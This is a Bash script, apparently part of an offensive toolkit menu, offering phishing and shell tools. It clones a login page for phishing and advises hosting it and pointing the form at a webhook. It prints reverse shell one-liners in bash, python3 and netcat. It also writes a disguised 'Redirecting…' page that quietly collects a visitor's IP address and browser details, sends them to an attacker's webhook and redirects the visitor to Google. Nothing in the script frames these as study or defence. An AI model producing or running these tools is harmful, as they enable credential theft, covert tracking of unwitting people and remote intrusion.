#!/usr/bin/env bash

m_phish() {
  while :; do
    printf '\n%s\n' "${B}${MAG}Phishing & Shells${R}"
    printf ' 1) clone a login page\n 2) reverse shell generator\n 3) IP logger page\n 0) back\n'
    printf '%s' "${BLU}phish>${R}"; read -r c
    case "$c" in 1) ph_clone; pause ;; 2) ph_shell; pause ;; 3) ph_log; pause ;; 0) return ;; esac
  done
}

ph_clone() {
  local u out
  u=$(ask "login page URL")
  out="$(lootdir)/site_$(date +%s)"
  mkdir -p "$out"
  curl -sL --max-time 25 -A "Mozilla/5.0" "$u" \
    | sed -E 's#(href|src)="/#\1="'"$u"'/#g' > "$out/index.html"
  [ -s "$out/index.html" ] && ok "saved → $out/index.html" || { err "empty"; return 1; }
  warn "inbound is blocked here — upload it to GitHub Pages or Netlify to make it live"
  warn "it's static: form submits go nowhere until you point action= at a webhook"
}

ph_shell() {
  local ip port
  ip=$(ask "your IP"); port=$(askdef "port" "4444")
  printf '\n%s\n' "${B}bash${R}"
  printf 'bash -i >& /dev/tcp/%s/%s 0>&1\n' "$ip" "$port"
  printf '%s\n' "${B}python3${R}"
  printf "python3 -c 'import socket,os,pty;s=socket.socket();s.connect((\"%s\",%s));[os.dup2(s.fileno(),f) for f in (0,1,2)];pty.spawn(\"/bin/sh\")'\n" "$ip" "$port"
  printf '%s\n' "${B}nc${R}"
  printf 'rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|sh -i 2>&1|nc %s %s >/tmp/f\n' "$ip" "$port"
  warn "listen with: nc -lvnp $port"
}

ph_log() {
  local hook out
  hook=$(ask "webhook URL (webhook.site / discord)")
  out="$(lootdir)/logger.html"
  cat > "$out" <<EOF
<!doctype html><meta charset=utf-8><title>Loading…</title>
<script>
const d={ua:navigator.userAgent,lang:navigator.language,scr:screen.width+"x"+screen.height,tz:Intl.DateTimeFormat().resolvedOptions().timeZone};
fetch("https://api.ipify.org?format=json").then(r=>r.json()).then(ip=>{
  d.ip=ip.ip;
  return fetch("$hook",{method:"POST",mode:"no-cors",headers:{"Content-Type":"text/plain"},body:JSON.stringify(d)});
}).catch(()=>{});
setTimeout(()=>location.replace("https://www.google.com"),1800);
</script>
<body style="font-family:system-ui;display:grid;place-items:center;height:100vh;margin:0">
<h2>Redirecting…</h2>
EOF
  ok "saved → $out"
  info "host it (GitHub Pages) then send the link"
}
